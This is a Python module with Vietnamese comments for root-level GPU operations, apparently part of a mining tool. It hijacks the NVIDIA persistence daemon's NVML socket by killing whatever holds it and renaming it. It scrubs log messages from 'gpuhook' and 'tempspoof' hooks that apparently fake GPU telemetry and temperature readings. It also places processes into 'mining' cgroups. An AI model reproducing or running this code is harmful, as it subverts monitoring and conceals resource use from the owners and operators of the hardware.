#!/usr/bin/env python3
"""
Privileged Operations Manager - ROOT MODE
Quản lý các thao tác privileged khi chạy với quyền root
"""

import os
import subprocess
import logging
from typing import List, Optional, Dict, Any
from pathlib import Path
import time
from functools import wraps
import threading
import shutil

def retry_on_failure(max_retries: int = 3, delay: float = 1.0):
    """
    Decorator để retry operations khi thất bại
    """
    def decorator(func):
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            last_error = None
            for attempt in range(max_retries):
                try:
                    return func(self, *args, **kwargs)
                except Exception as e:
                    last_error = e
                    if attempt < max_retries - 1:
                        self.logger.warning(f"Attempt {attempt + 1} failed for {func.__name__}: {e}")
                        time.sleep(delay * (attempt + 1))  # Exponential backoff
                    else:
                        self.logger.error(f"All {max_retries} attempts failed for {func.__name__}: {e}")
            if last_error:
                raise last_error
            else:
                raise RuntimeError(f"Failed to execute {func.__name__}")
        return wrapper
    return decorator

class PrivilegedOperationManager:
    """
    Manager cho các operations privileged - ROOT MODE
    Simplified version vì chạy với quyền root
    """
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls, logger: Optional[logging.Logger] = None):
        if cls._instance is None:
            with cls._lock:
                # **Double-check locking pattern** (mẫu khóa kiểm tra kép)
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self, logger: Optional[logging.Logger] = None):
        # Chỉ init một lần
        if hasattr(self, '_initialized'):
            return
            
        self._initialized = True
        self.logger = logger or logging.getLogger(__name__)
        self.current_user = os.getenv('USER', 'root')
        self.is_root = os.getuid() == 0
        
        # Cache cho các operations
        self._gpu_info_cache = None
        self._gpu_info_cache_time = 0
        self._cache_ttl = 300  # 5 minutes
        
        if not self.is_root:
            self.logger.warning("⚠️ Not running as root - some operations may fail")
        else:
            self.logger.info("🔑 Running as root - all privileged operations available")
        
    def _run_command(self, command: List[str], check: bool = True) -> subprocess.CompletedProcess:
        """
        Chạy command trực tiếp (vì đã là root)
        """
        self.logger.debug(f"[ROOT] Running: {' '.join(command)}")
        
        # Clone current env nhưng tạm thời gỡ bỏ LD_PRELOAD để tránh gpuhook can thiệp vào các tiện ích hệ thống
        env = os.environ.copy()
        if env.get("KEEP_HOOKS_IN_PRIV_CMDS", "0") != "1":
            env.pop("LD_PRELOAD", None)

        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            env=env,
            check=check
        )

        # Loại bỏ thông điệp hook nếu vẫn còn trong stderr để log sạch hơn
        cleaned_stderr = (result.stderr or "").replace("[gpuhook] NVML hook installed.", "").replace("[tempspoof] Thermal spoof hook active", "").strip()
        cleaned_stdout = (result.stdout or "").strip()
        
        if result.returncode != 0:
            self.logger.error(f"[ROOT] Command failed: {cleaned_stderr}")
        else:
            if cleaned_stdout:
                self.logger.debug(f"[ROOT] Success: {cleaned_stdout[:200]}...")
            
        return result
    
    def load_ebpf_program(self, bpf_obj_path: str) -> bool:
        """
        eBPF functionality removed for memory optimization
        """
        self.logger.warning("eBPF functionality has been removed for memory optimization")
        return False
    
    def create_namespace_isolation(self, command: List[str]) -> subprocess.Popen:
        """
        Tạo namespace isolation cho command
        """
        try:
            # Unshare network và mount namespaces
            full_cmd = [
                "unshare", "-p", "-m", "-n", "--fork", "--mount-proc"
            ] + command
            
            process = subprocess.Popen(
                full_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.logger.info(f"Created isolated process with PID: {process.pid}")
            return process
            
        except Exception as e:
            self.logger.error(f"Failed to create namespace isolation: {e}")
            raise
    
    @retry_on_failure(max_retries=2, delay=0.5)
    def set_gpu_clock_limits(self, gpu_id: int, sm_clock: int, mem_clock: int) -> bool:
        """
        Điều chỉnh GPU clock limits
        """
        try:
            # Sử dụng nvidia-smi để set clocks
            result = self._run_command([
                "nvidia-smi", "-i", str(gpu_id),
                "-ac", f"{mem_clock},{sm_clock}"
            ], check=False)
            
            if result.returncode == 0:
                self.logger.info(f"GPU {gpu_id} clocks set: SM={sm_clock}MHz, MEM={mem_clock}MHz")
                return True
            else:
                # Try alternative method via sysfs
                return self._set_gpu_clocks_sysfs(gpu_id, sm_clock, mem_clock)
                
        except Exception as e:
            self.logger.error(f"Failed to set GPU clocks: {e}")
            return False
    
    def _set_gpu_clocks_sysfs(self, gpu_id: int, sm_clock: int, mem_clock: int) -> bool:
        """
        Fallback method để set GPU clocks qua sysfs
        """
        try:
            # Thử set qua sysfs nếu nvidia-smi fail
            sysfs_paths = [
                f"/sys/class/drm/card{gpu_id}/device/pp_od_clk_voltage",
                f"/sys/class/drm/card{gpu_id}/device/pp_sclk_od",
                f"/sys/class/drm/card{gpu_id}/device/pp_mclk_od"
            ]
            
            for path in sysfs_paths:
                if Path(path).exists():
                    self.logger.info(f"Found sysfs control at: {path}")
                    # Implement sysfs clock control if needed
                    return True
                    
            self.logger.warning(f"No sysfs controls found for GPU {gpu_id}")
            return False
            
        except Exception as e:
            self.logger.error(f"sysfs clock control failed: {e}")
            return False
    
    @retry_on_failure(max_retries=3, delay=1.0)
    def hijack_nvml_socket(self, socket_path: str = "/var/run/nvidia-persistenced/socket") -> bool:
        """
        Hijack NVML IPC socket:
        1. Dừng process giữ socket (nvidia-persistenced)
        2. Di chuyển socket gốc sang *.original
        3. Trả về True nếu thành công
        """
        try:
            if not Path(socket_path).exists():
                self.logger.info(f"NVML socket not found: {socket_path}")
                return False
            backup_path = f"{socket_path}.original"

            # Nếu socket đang bị hold, kill tiến trình giữ nó
            try:
                import subprocess, shlex
                self._run_command(["fuser", "-k", socket_path], check=False)
                time.sleep(0.3)
            except Exception:
                pass  # fuser có thể không tồn tại

            # Retry rename
            try:
                os.rename(socket_path, backup_path)
                self.logger.info(f"NVML socket hijacked → {backup_path}")
                return True
            except OSError as e:
                self.logger.error(f"Rename failed: {e}")
                # Fallback: unlink & move
                try:
                    temp_copy = f"{socket_path}.bak"
                    shutil.copy2(socket_path, temp_copy)
                    os.unlink(socket_path)
                    os.rename(temp_copy, backup_path)
                    self.logger.info("Hijack via copy+unlink success")
                    return True
                except Exception as inner:
                    self.logger.error(f"Hijack fallback failed: {inner}")
                    return False
        except Exception as e:
            self.logger.error(f"NVML socket hijacking failed: {e}")
            return False
    
    @retry_on_failure(max_retries=2, delay=0.5)
    def setup_cgroup_limits(self, pid: int, cpu_limit: str, memory_limit: str) -> bool:
        """
        Thiết lập cgroup limits cho process
        """
        try:
            cgroup_name = f"mining_pid_{pid}"
            cgroup_path = f"/sys/fs/cgroup/mining/{cgroup_name}"
            
            # Tạo cgroup
            Path(cgroup_path).mkdir(parents=True, exist_ok=True)
            
            # Set CPU limit
            if cpu_limit:
                with open(f"{cgroup_path}/cpu.cfs_quota_us", "w") as f:
                    f.write(cpu_limit)
            
            # Set memory limit  
            if memory_limit:
                with open(f"{cgroup_path}/memory.limit_in_bytes", "w") as f:
                    f.write(memory_limit)
            
            # Add process to cgroup
            with open(f"{cgroup_path}/cgroup.procs", "w") as f:
                f.write(str(pid))
                
            self.logger.info(f"Cgroup limits set for PID {pid}: CPU={cpu_limit}, MEM={memory_limit}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to setup cgroup limits: {e}")
            return False
    
    def check_gpu_access(self) -> Dict[str, Any]:
        """
        Kiểm tra quyền truy cập GPU (với caching)
        """
        # Kiểm tra cache
        current_time = time.time()
        if (self._gpu_info_cache is not None and 
            current_time - self._gpu_info_cache_time < self._cache_ttl):
            self.logger.debug("Returning cached GPU info")
            return self._gpu_info_cache
            
        access_info = {
            "nvidia_smi_available": False,
            "gpu_count": 0,
            "device_nodes": [],
            "render_nodes": [],
            "driver_version": None
        }
        
        try:
            # Kiểm tra nvidia-smi
            result = self._run_command(["nvidia-smi", "-L"], check=False)
            if result.returncode == 0:
                access_info["nvidia_smi_available"] = True
                gpu_lines = [line for line in result.stdout.split('\n') if 'GPU' in line]
                access_info["gpu_count"] = len(gpu_lines)
                
                # Get driver version
                version_result = self._run_command(["nvidia-smi", "--query-gpu=driver_version", "--format=csv,noheader"], check=False)
                if version_result.returncode == 0:
                    access_info["driver_version"] = version_result.stdout.strip().split('\n')[0]
            
            # Kiểm tra device nodes
            dev_path = Path("/dev")
            if dev_path.exists():
                access_info["device_nodes"] = [
                    str(p) for p in dev_path.glob("nvidia*") 
                    if p.is_char_device()
                ]
                access_info["render_nodes"] = [
                    str(p) for p in dev_path.glob("dri/render*")
                    if p.is_char_device()
                ]
            
            # Update cache
            self._gpu_info_cache = access_info
            self._gpu_info_cache_time = current_time
                
        except Exception as e:
            self.logger.error(f"GPU access check failed: {e}")
            
        return access_info
    
    def validate_security_context(self) -> Dict[str, Any]:
        """
        Validate security context và permissions
        """
        context = {
            "user": self.current_user,
            "uid": os.getuid(),
            "gid": os.getgid(),
            "is_root": self.is_root,
            "groups": [],
            "capabilities": [],
            "container_runtime": self._detect_container_runtime()
        }
        
        try:
            # Lấy groups
            import grp
            groups = [grp.getgrgid(gid).gr_name for gid in os.getgroups()]
            context["groups"] = groups
            
            # Kiểm tra capabilities (nếu có capsh)
            result = subprocess.run(["capsh", "--print"], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                context["capabilities"] = result.stdout.split('\n')
                
        except Exception as e:
            self.logger.error(f"Security context validation failed: {e}")
            
        return context
    
    def _detect_container_runtime(self) -> str:
        """
        Phát hiện container runtime (Docker, Podman, etc.)
        """
        try:
            if Path("/.dockerenv").exists():
                return "docker"
            
            with open("/proc/1/cgroup", "r") as f:
                content = f.read()
                if "docker" in content:
                    return "docker"
                elif "podman" in content:
                    return "podman"
                elif "containerd" in content:
                    return "containerd"
                    
            return "unknown"
        except:
            return "unknown"


def get_privileged_manager(logger: Optional[logging.Logger] = None) -> PrivilegedOperationManager:
    """
    Factory function để tạo PrivilegedOperationManager
    """
    return PrivilegedOperationManager(logger)


if __name__ == "__main__":
    # Test script
    import logging
    logging.basicConfig(level=logging.INFO)
    
    manager = get_privileged_manager()
    
    print("=== Security Context ===")
    context = manager.validate_security_context()
    for key, value in context.items():
        print(f"{key}: {value}")
    
    print("\n=== GPU Access ===")
    gpu_info = manager.check_gpu_access()
    for key, value in gpu_info.items():
        print(f"{key}: {value}") 